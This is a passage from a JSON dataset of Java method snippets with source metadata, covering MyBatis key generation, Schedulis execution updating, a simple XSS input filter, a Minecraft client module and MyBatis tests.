"https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/Jdbc3KeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 34298, "method_name": "processBatch", "class_name": "Jdbc3KeyGenerator", "params": ["MappedStatement", "Statement", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void processBatch(MappedStatement ms, Statement stmt, Object parameter) {\n    final String[] keyProperties = ms.getKeyProperties();\n    if (keyProperties == null || keyProperties.length == 0) {\n      return;\n    }\n    try (ResultSet rs = stmt.getGeneratedKeys()) {\n      final ResultSetMetaData rsmd = rs.getMetaData();\n      final Configuration configuration = ms.getConfiguration();\n      if (rsmd.getColumnCount() < keyProperties.length) {\n        // Error?\n      } else {\n        assignKeys(configuration, rs, rsmd, keyProperties, parameter);\n      }\n    } catch (Exception e) {\n      throw new ExecutorException(\"Error getting generated key or setting result to parameter object. Cause: \" + e, e);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/Jdbc3KeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 34299, "method_name": "assignKeys", "class_name": "Jdbc3KeyGenerator", "params": ["Configuration", "ResultSet", "ResultSetMetaData", "String", "Object"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void assignKeys(Configuration configuration, ResultSet rs, ResultSetMetaData rsmd, String[] keyProperties,\n      Object parameter) throws SQLException {\n    if (parameter instanceof ParamMap || parameter instanceof StrictMap) {\n      // Multi-param or single param with @Param\n      assignKeysToParamMap(configuration, rs, rsmd, keyProperties, (Map<String, ?>) parameter);\n    } else if (parameter instanceof ArrayList && !((ArrayList<?>) parameter).isEmpty()\n        && ((ArrayList<?>) parameter).get(0) instanceof ParamMap) {\n      // Multi-param or single param with @Param in batch operation\n      assignKeysToParamMapList(configuration, rs, rsmd, keyProperties, (ArrayList<ParamMap<?>>) parameter);\n    } else {\n      // Single param without @Param\n      assignKeysToParam(configuration, rs, rsmd, keyProperties, parameter);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/Jdbc3KeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 34300, "method_name": "assignKeysToParam", "class_name": "Jdbc3KeyGenerator", "params": ["Configuration", "ResultSet", "ResultSetMetaData", "String", "Object"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void assignKeysToParam(Configuration configuration, ResultSet rs, ResultSetMetaData rsmd,\n      String[] keyProperties, Object parameter) throws SQLException {\n    Collection<?> params = collectionize(parameter);\n    if (params.isEmpty()) {\n      return;\n    }\n    List<KeyAssigner> assignerList = new ArrayList<>();\n    for (int i = 0; i < keyProperties.length; i++) {\n      assignerList.add(new KeyAssigner(configuration, rsmd, i + 1, null, keyProperties[i]));\n    }\n    Iterator<?> iterator = params.iterator();\n    while (rs.next()) {\n      if (!iterator.hasNext()) {\n        throw new ExecutorException(String.format(MSG_TOO_MANY_KEYS, params.size()));\n      }\n      Object param = iterator.next();\n      assignerList.forEach(x -> x.assign(rs, param));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/Jdbc3KeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 34301, "method_name": "assignKeysToParamMapList", "class_name": "Jdbc3KeyGenerator", "params": ["Configuration", "ResultSet", "ResultSetMetaData", "String", "ArrayList<ParamMap>"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void assignKeysToParamMapList(Configuration configuration, ResultSet rs, ResultSetMetaData rsmd,\n      String[] keyProperties, ArrayList<ParamMap<?>> paramMapList) throws SQLException {\n    Iterator<ParamMap<?>> iterator = paramMapList.iterator();\n    List<KeyAssigner> assignerList = new ArrayList<>();\n    long counter = 0;\n    while (rs.next()) {\n      if (!iterator.hasNext()) {\n        throw new ExecutorException(String.format(MSG_TOO_MANY_KEYS, counter));\n      }\n      ParamMap<?> paramMap = iterator.next();\n      if (assignerList.isEmpty()) {\n        for (int i = 0; i < keyProperties.length; i++) {\n          assignerList\n              .add(getAssignerForParamMap(configuration, rsmd, i + 1, paramMap, keyProperties[i], keyProperties, false)\n                  .getValue());\n        }\n      }\n      assignerList.forEach(x -> x.assign(rs, paramMap));\n      counter++;\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/Jdbc3KeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 34302, "method_name": "assignKeysToParamMap", "class_name": "Jdbc3KeyGenerator", "params": ["Configuration", "ResultSet", "ResultSetMetaData", "String", "Map<String,?>"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void assignKeysToParamMap(Configuration configuration, ResultSet rs, ResultSetMetaData rsmd,\n      String[] keyProperties, Map<String, ?> paramMap) throws SQLException {\n    if (paramMap.isEmpty()) {\n      return;\n    }\n    Map<String, Entry<Iterator<?>, List<KeyAssigner>>> assignerMap = new HashMap<>();\n    for (int i = 0; i < keyProperties.length; i++) {\n      Entry<String, KeyAssigner> entry = getAssignerForParamMap(configuration, rsmd, i + 1, paramMap, keyProperties[i],\n          keyProperties, true);\n      Entry<Iterator<?>, List<KeyAssigner>> iteratorPair = assignerMap.computeIfAbsent(entry.getKey(),\n          k -> entry(collectionize(paramMap.get(k)).iterator(), new ArrayList<>()));\n      iteratorPair.getValue().add(entry.getValue());\n    }\n    long counter = 0;\n    while (rs.next()) {\n      for (Entry<Iterator<?>, List<KeyAssigner>> pair : assignerMap.values()) {\n        if (!pair.getKey().hasNext()) {\n          throw new ExecutorException(String.format(MSG_TOO_MANY_KEYS, counter));\n        }\n        Object param = pair.getKey().next();\n        pair.getValue().forEach(x -> x.assign(rs, param));\n      }\n      counter++;\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/Jdbc3KeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 34303, "method_name": "getAssignerForParamMap", "class_name": "Jdbc3KeyGenerator", "params": ["Configuration", "ResultSetMetaData", "int", "Map<String,?>", "String", "String", "boolean"], "throws": null, "modifiers": ["private"], "return_type": "Entry<String,KeyAssigner>", "snippet": "  private Entry<String, KeyAssigner> getAssignerForParamMap(Configuration config, ResultSetMetaData rsmd,\n      int columnPosition, Map<String, ?> paramMap, String keyProperty, String[] keyProperties, boolean omitParamName) {\n    Set<String> keySet = paramMap.keySet();\n    // A caveat : if the only parameter has {@code @Param(\"param2\")} on it,\n    // it must be referenced with param name e.g. 'param2.x'.\n    boolean singleParam = !keySet.contains(SECOND_GENERIC_PARAM_NAME);\n    int firstDot = keyProperty.indexOf('.');\n    if (firstDot == -1) {\n      if (singleParam) {\n        return getAssignerForSingleParam(config, rsmd, columnPosition, paramMap, keyProperty, omitParamName);\n      }\n      throw new ExecutorException(\"Could not determine which parameter to assign generated keys to. \"\n          + \"Note that when there are multiple parameters, 'keyProperty' must include the parameter name (e.g. 'param.id'). \"\n          + \"Specified key properties are \" + ArrayUtil.toString(keyProperties) + \" and available parameters are \"\n          + keySet);\n    }\n    String paramName = keyProperty.substring(0, firstDot);\n    if (keySet.contains(paramName)) {\n      String argParamName = omitParamName ? null : paramName;\n      String argKeyProperty = keyProperty.substring(firstDot + 1);\n      return entry(paramName, new KeyAssigner(config, rsmd, columnPosition, argParamName, argKeyProperty));\n    } else if (singleParam) {\n      return getAssignerForSingleParam(config, rsmd, columnPosition, paramMap, keyProperty, omitParamName);\n    } else {\n      throw new ExecutorException(\"Could not find parameter '\" + paramName + \"'. \"\n          + \"Note that when there are multiple parameters, 'keyProperty' must include the parameter name (e.g. 'param.id'). \"\n          + \"Specified key properties are \" + ArrayUtil.toString(keyProperties) + \" and available parameters are \"\n          + keySet);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/Jdbc3KeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 34304, "method_name": "getAssignerForSingleParam", "class_name": "Jdbc3KeyGenerator", "params": ["Configuration", "ResultSetMetaData", "int", "Map<String,?>", "String", "boolean"], "throws": null, "modifiers": ["private"], "return_type": "Entry<String,KeyAssigner>", "snippet": "  private Entry<String, KeyAssigner> getAssignerForSingleParam(Configuration config, ResultSetMetaData rsmd,\n      int columnPosition, Map<String, ?> paramMap, String keyProperty, boolean omitParamName) {\n    // Assume 'keyProperty' to be a property of the single param.\n    String singleParamName = nameOfSingleParam(paramMap);\n    String argParamName = omitParamName ? null : singleParamName;\n    return entry(singleParamName, new KeyAssigner(config, rsmd, columnPosition, argParamName, keyProperty));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/Jdbc3KeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 34305, "method_name": "nameOfSingleParam", "class_name": "Jdbc3KeyGenerator", "params": ["Map<String,?>"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String nameOfSingleParam(Map<String, ?> paramMap) {\n    // There is virtually one parameter, so any key works.\n    return paramMap.keySet().iterator().next();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/Jdbc3KeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 34306, "method_name": "collectionize", "class_name": "Jdbc3KeyGenerator", "params": ["Object"], "throws": null, "modifiers": ["private", "static"], "return_type": "Collection<?>", "snippet": "  private static Collection<?> collectionize(Object param) {\n    if (param instanceof Collection) {\n      return (Collection<?>) param;\n    } else if (param instanceof Object[]) {\n      return Arrays.asList((Object[]) param);\n    } else {\n      return Arrays.asList(param);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/Jdbc3KeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 34307, "method_name": "entry", "class_name": "Jdbc3KeyGenerator", "params": ["K", "V"], "throws": null, "modifiers": ["private", "static"], "return_type": "Entry<K,V>", "snippet": "  private static <K, V> Entry<K, V> entry(K key, V value) {\n    // Replace this with Map.entry(key, value) in Java 9.\n    return new AbstractMap.SimpleImmutableEntry<>(key, value);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/Jdbc3KeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 34308, "method_name": "assign", "class_name": "KeyAssigner", "params": ["ResultSet", "Object"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void assign(ResultSet rs, Object param) {\n      if (paramName != null) {\n        // If paramName is set, param is ParamMap\n        param = ((ParamMap<?>) param).get(paramName);\n      }\n      MetaObject metaParam = configuration.newMetaObject(param);\n      try {\n        if (typeHandler == null) {\n          if (metaParam.hasSetter(propertyName)) {\n            Class<?> propertyType = metaParam.getSetterType(propertyName);\n            typeHandler = typeHandlerRegistry.getTypeHandler(propertyType,\n                JdbcType.forCode(rsmd.getColumnType(columnPosition)));\n          } else {\n            throw new ExecutorException(\"No setter found for the keyProperty '\" + propertyName + \"' in '\"\n                + metaParam.getOriginalObject().getClass().getName() + \"'.\");\n          }\n        }\n        if (typeHandler == null) {\n          // Error?\n        } else {\n          Object value = typeHandler.getResult(rs, columnPosition);\n          metaParam.setValue(propertyName, value);\n        }\n      } catch (SQLException e) {\n        throw new ExecutorException(\"Error getting generated key or setting result to parameter object. Cause: \" + e,\n            e);\n      }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/Jdbc3KeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 34309, "method_name": "getSpriteForSide", "class_name": "RandomSpriteProvider", "params": ["Direction", "BlockRenderView", "BlockState", "BlockPos", "Random"], "throws": null, "modifiers": ["public"], "return_type": "Sprite", "snippet": "\tpublic Sprite getSpriteForSide(Direction side, BlockRenderView view, BlockState state, BlockPos pos, Random random) {\n\t\treturn connects[random.nextInt(connects.length)];\n\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/sprite/RandomSpriteProvider.java", "stars": "3", "class_props": {"extends": "BaseSpriteProvider", "implements": null, "modifiers": ["public"]}}, {"id": 34310, "method_name": "onUpdate", "class_name": "FastPlace", "params": ["UpdateEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onUpdate(UpdateEvent event) {\n        if (exp && !(mc.player.inventory.getCurrentItem().getItem() instanceof ItemExpBottle))\n            return;\n        if (crystal && !(mc.player.inventory.getCurrentItem().getItem() instanceof ItemEndCrystal))\n            return;\n        mc.rightClickDelayTimer = 0;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/misc/FastPlace.java", "stars": "12", "class_props": {"extends": "Module", "implements": null, "modifiers": ["public"]}}, {"id": 34311, "method_name": "updateExecutions", "class_name": "RunningExecutionsUpdater", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void updateExecutions() {\n    this.updaterStage.set(\"Starting update all flows.\");\n    final Map<Optional<Executor>, List<ExecutableFlow>> exFlowMap = getFlowToExecutorMap();\n    final ArrayList<ExecutableFlow> finalizeFlows =\n        new ArrayList<>();\n\n    for (final Map.Entry<Optional<Executor>, List<ExecutableFlow>> entry : exFlowMap\n        .entrySet()) {\n\n      final Optional<Executor> executorOption = entry.getKey();\n      if (!executorOption.isPresent()) {\n        for (final ExecutableFlow flow : entry.getValue()) {\n          logger.warn(\"Finalizing execution \" + flow.getExecutionId()\n              + \". Executor id of this execution doesn't exist\");\n          finalizeFlows.add(flow);\n        }\n        continue;\n      }\n      final Executor executor = executorOption.get();\n\n      this.updaterStage.set(\"Starting update flows on \" + executor.getHost() + \":\"\n          + executor.getPort());\n\n      Map<String, Object> results = null;\n      try {\n        results = this.apiGateway.updateExecutions(executor, entry.getValue());\n      } catch (final ExecutorManagerException e) {\n        handleException(entry, executor, e, finalizeFlows);\n      }\n\n      if (results != null) {\n        final List<Map<String, Object>> executionUpdates =\n            (List<Map<String, Object>>) results\n                .get(ConnectorParams.RESPONSE_UPDATED_FLOWS);\n        for (final Map<String, Object> updateMap : executionUpdates) {\n          try {\n            final ExecutableFlow flow = updateExecution(updateMap);\n\n            this.updaterStage.set(\"Updated flow \" + flow.getExecutionId());\n\n            if (ExecutionControllerUtils.isFinished(flow)) {\n              finalizeFlows.add(flow);\n            }\n          } catch (final ExecutorManagerException e) {\n            final ExecutableFlow flow = e.getExecutableFlow();\n            logger.error(e);\n\n            if (flow != null) {\n              logger.warn(\"Finalizing execution \" + flow.getExecutionId());\n              finalizeFlows.add(flow);\n            }\n          }\n        }\n      }\n    }\n\n    this.updaterStage.set(\"Finalizing \" + finalizeFlows.size() + \" error flows.\");\n    for (final ExecutableFlow flow : finalizeFlows) {\n      this.executionFinalizer\n          .finalizeFlow(flow, \"Not running on the assigned executor (any more)\", null);\n    }\n\n    this.updaterStage.set(\"Updated all active flows. Waiting for next round.\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/RunningExecutionsUpdater.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34312, "method_name": "handleException", "class_name": "RunningExecutionsUpdater", "params": ["Entry<Optional,List>", "Executor", "ExecutorManagerException", "ArrayList<ExecutableFlow>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleException(final Entry<Optional<Executor>, List<ExecutableFlow>> entry,\n      final Executor executor, final ExecutorManagerException e,\n      final ArrayList<ExecutableFlow> finalizeFlows) {\n    logger.error(\"Failed to get update from executor \" + executor.getHost(), e);\n    boolean sendUnresponsiveEmail = false;\n    final boolean executorRemoved = isExecutorRemoved(executor.getId());\n    for (final ExecutableFlow flow : entry.getValue()) {\n      final Pair<ExecutionReference, ExecutableFlow> pair =\n          this.runningExecutions.get().get(flow.getExecutionId());\n\n      this.updaterStage\n          .set(\"Failed to get update for flow \" + pair.getSecond().getExecutionId());\n\n      if (executorRemoved) {\n        logger.warn(\"Finalizing execution \" + flow.getExecutionId()\n            + \". Executor is removed\");\n        finalizeFlows.add(flow);\n        // FIXME executor is removed, stop the cycle flow and alert.\n        finalizeCycleFlow(flow);\n      } else {\n        final ExecutionReference ref = pair.getFirst();\n        ref.setNextCheckTime(DateTime.now().getMillis() + this.errorThreshold);\n        ref.setNumErrors(ref.getNumErrors() + 1);\n        if (ref.getNumErrors() == this.numErrorsBeforeUnresponsiveEmail\n            || ref.getNumErrors() % this.numErrorsBetweenUnresponsiveEmail == 0) {\n          // if any of the executions has failed many enough updates, alert\n          // and stop the cycle flow, alert\n          sendUnresponsiveEmail = true;\n\t\t      // FIXME executor is removed, stop the cycle flow and alert.\n          finalizeCycleFlow(flow);\n        }\n      }\n    }\n    if (sendUnresponsiveEmail) {    //\u8bf7\u6c42\u4e0d\u901aexecutor\u5f02\u5e38\u544a\u8b66\n      final Alerter mailAlerter = this.alerterHolder.get(\"email\");\n//      mailAlerter.alertOnFailedUpdate(executor, entry.getValue(), e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/RunningExecutionsUpdater.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34313, "method_name": "isExecutorRemoved", "class_name": "RunningExecutionsUpdater", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isExecutorRemoved(final int id) {\n    final Executor fetchedExecutor;\n    try {\n      fetchedExecutor = this.executorLoader.fetchExecutor(id);\n    } catch (final ExecutorManagerException e) {\n      logger.error(\"Couldn't check if executor exists\", e);\n      // don't know if removed or not -> default to false\n      return false;\n    }\n    return fetchedExecutor == null;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/RunningExecutionsUpdater.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34314, "method_name": "getFlowToExecutorMap", "class_name": "RunningExecutionsUpdater", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Map<Optional,List>", "snippet": "  private Map<Optional<Executor>, List<ExecutableFlow>> getFlowToExecutorMap() {\n    final HashMap<Optional<Executor>, List<ExecutableFlow>> exFlowMap =\n        new HashMap<>();\n\n    for (final Pair<ExecutionReference, ExecutableFlow> runningFlow : this.runningExecutions.get()\n        .values()) {\n      final ExecutionReference ref = runningFlow.getFirst();\n      final ExecutableFlow flow = runningFlow.getSecond();\n      final Optional<Executor> executor = ref.getExecutor();\n\n      // We can set the next check time to prevent the checking of certain\n      // flows.\n      if (ref.getNextCheckTime() >= DateTime.now().getMillis()) {\n        continue;\n      }\n\n      List<ExecutableFlow> flows = exFlowMap.get(executor);\n      if (flows == null) {\n        flows = new ArrayList<>();\n        exFlowMap.put(executor, flows);\n      }\n\n      flows.add(flow);\n    }\n\n    return exFlowMap;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/RunningExecutionsUpdater.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34315, "method_name": "updateExecution", "class_name": "RunningExecutionsUpdater", "params": ["Map<String,Object>"], "throws": ["ExecutorManagerException"], "modifiers": ["private"], "return_type": "ExecutableFlow", "snippet": "  private ExecutableFlow updateExecution(final Map<String, Object> updateData)\n      throws ExecutorManagerException {\n\n    final Integer execId =\n        (Integer) updateData.get(ConnectorParams.UPDATE_MAP_EXEC_ID);\n    if (execId == null) {\n      throw new ExecutorManagerException(\n          \"Response is malformed. Need exec id to update.\");\n    }\n\n    final Pair<ExecutionReference, ExecutableFlow> refPair =\n        this.runningExecutions.get().get(execId);\n    if (refPair == null) {\n      // this shouldn't ever happen on real azkaban runtime.\n      // but this can easily happen in unit tests if there's some inconsistent mocking.\n      throw new ExecutorManagerException(\n          \"No execution found in the map with the execution id any more. Removing \" + execId);\n    }\n\n    final ExecutionReference ref = refPair.getFirst();\n    final ExecutableFlow flow = refPair.getSecond();\n    if (updateData.containsKey(\"error\")) {\n      // The flow should be finished here.\n      throw new ExecutorManagerException((String) updateData.get(\"error\"), flow);\n    }\n\n    // Reset errors.\n    ref.setNextCheckTime(0);\n    ref.setNumErrors(0);\n    final Status oldStatus = flow.getStatus();\n    flow.applyUpdateObject(updateData);\n    final Status newStatus = flow.getStatus();\n\n    if (oldStatus != newStatus && newStatus == Status.FAILED) {\n      this.commonMetrics.markFlowFail();\n    }\n\n    if (oldStatus != newStatus && newStatus.equals(Status.FAILED_FINISHING)) {\n      // \u901a\u7528\u544a\u8b66\n      ExecutionControllerUtils.alertUserOnFirstError(flow, this.alerterHolder);\n    }\n\n    return flow;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/RunningExecutionsUpdater.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34316, "method_name": "getAlerterHolder", "class_name": "RunningExecutionsUpdater", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AlerterHolder", "snippet": "  public AlerterHolder getAlerterHolder() {\n    return alerterHolder;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/RunningExecutionsUpdater.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34317, "method_name": "finalizeCycleFlow", "class_name": "RunningExecutionsUpdater", "params": ["ExecutableFlow"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void finalizeCycleFlow(ExecutableFlow flow) {\n    try {\n      if (flow.getFlowType() == 4) {\n        ExecutionCycle cycleFlow = executorLoader.getExecutionCycleFlow(String.valueOf(flow.getProjectId()), flow.getId());\n        if (cycleFlow != null && cycleFlow.getStatus() == Status.RUNNING) {\n          cycleFlow.setStatus(Status.FAILED);\n          cycleFlow.setEndTime(System.currentTimeMillis());\n          executorLoader.updateExecutionFlow(cycleFlow);\n          ExecutionControllerUtils.alertOnCycleFlowInterrupt(flow, cycleFlow, this.alerterHolder);\n        }\n      }\n    } catch (ExecutorManagerException e) {\n      logger.error(\"finalize cycle flow error execId:\" + flow.getExecutionId(), e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/RunningExecutionsUpdater.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34318, "method_name": "main", "class_name": "Demo", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        int a = 10;\n        int b = 20;\n        int c = a + b;\n        System.out.println(c);\n\n        // to store decimal values\n        // produces floating point error\n        // for large values, some data will be lost\n        float d = 10.45634567876543456789876543234f;\n        System.out.println(d);\n\n        // double\n        double e = 10.45363;\n        System.out.println(e);\n\n        long ll = 23456787543234567l;\n        System.out.println(ll);\n\n        boolean bb = true;\n\n        char ch = 'a';\n\n        String s = \"Kunal Kushwaha\";\n        System.out.println(s);\n    }", "url": "https://raw.githubusercontent.com/kunal-kushwaha/Progate-Java-101/master/src/com/kunal/Demo.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34319, "method_name": "invalidStringFilter", "class_name": "XSSFilterUtils", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "  public static boolean invalidStringFilter(String requestString){\n    boolean invalidFlag = false;\n    //\u5982\u679c\u8bf7\u6c42\u53c2\u6570\u5305\u542b\u975e\u6cd5\u5b57\u7b26\n//    if(org.apache.commons.lang.StringUtils.containsAny(requestString,\n//        new char[]{'<', '>', '\\\"', '\\'', ';', '(', ')', '+', '&lt', '&gt'})){\n//      containsFlag\n//    }\n    requestString = StringEscapeUtils.unescapeHtml(requestString);\n//    if(null != requestString && htmlContainsAny(requestString,\n//        new String[]{\"<\", \">\", \"\\\"\", \"\\'\", \";\", \"(\", \")\", \"+\", \"&lt\", \"&gt\", \"%2B\", \"%22\", \"%28\", \"%29\",\n//        \"%3C\", \"%3E\"})){\n//      invalidFlag = true;\n//    }\n    if(null != requestString){\n      if(org.apache.commons.lang.StringUtils.containsAny(requestString,\n          new char[]{'<', '>', '\\\"', '\\'', ';', '(', ')', '+'})\n          || requestString.contains(\"%3\") || requestString.contains(\"%2\")){\n        invalidFlag = true;\n      }\n    }\n\n\n    return invalidFlag;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/utils/XSSFilterUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34320, "method_name": "htmlContainsAny", "class_name": "XSSFilterUtils", "params": ["String", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "boolean", "snippet": "  private static boolean htmlContainsAny(String requestString, String rules[]){\n    boolean containsFlag = false;\n\n    for(String rule : rules){\n      containsFlag = requestString.contains(rule);\n      if(containsFlag){\n        break;\n      }\n    }\n\n    return containsFlag;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/utils/XSSFilterUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34321, "method_name": "invalidCookieFilter", "class_name": "XSSFilterUtils", "params": ["HttpServletRequest"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "  public static boolean invalidCookieFilter(HttpServletRequest req){\n    boolean invalidFlag = false;\n    Cookie[] cookies = req.getCookies();\n    if(null!=cookies){\n      for(int i=0;i<cookies.length;i++){\n        if(invalidStringFilter(cookies[i].getValue())){\n          invalidFlag =true;\n          break;\n        }\n      }\n    }\n    return invalidFlag;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/utils/XSSFilterUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34322, "method_name": "setUp", "class_name": "SelectKeyTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void setUp() throws Exception {\n    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/selectkey/MapperConfig.xml\")) {\n      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n      sqlSessionFactory.getConfiguration().addMapper(AnnotatedMapper.class);\n    }\n\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n            \"org/apache/ibatis/submitted/selectkey/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34323, "method_name": "testSelectKey", "class_name": "SelectKeyTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testSelectKey() throws Exception {\n    // this test checks to make sure that we can have select keys with the same\n    // insert id in different namespaces\n    String resource = \"org/apache/ibatis/submitted/selectkey/MapperConfig.xml\";\n    Reader reader = Resources.getResourceAsReader(resource);\n    SqlSessionFactoryBuilder builder = new SqlSessionFactoryBuilder();\n    SqlSessionFactory sqlMapper = builder.build(reader);\n    assertNotNull(sqlMapper);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34324, "method_name": "testInsertTable1", "class_name": "SelectKeyTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testInsertTable1() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Map<String, Object> parms = new HashMap<>();\n      parms.put(\"name\", \"Fred\");\n      int rows = sqlSession.insert(\"org.apache.ibatis.submitted.selectkey.Table1.insert\", parms);\n      assertEquals(1, rows);\n      assertEquals(11, parms.get(\"id\"));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/selectkey/SelectKeyTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34325, "method_name": "testInsertTable2", "class_name": "SelectKeyTest", "params": [], "throws": 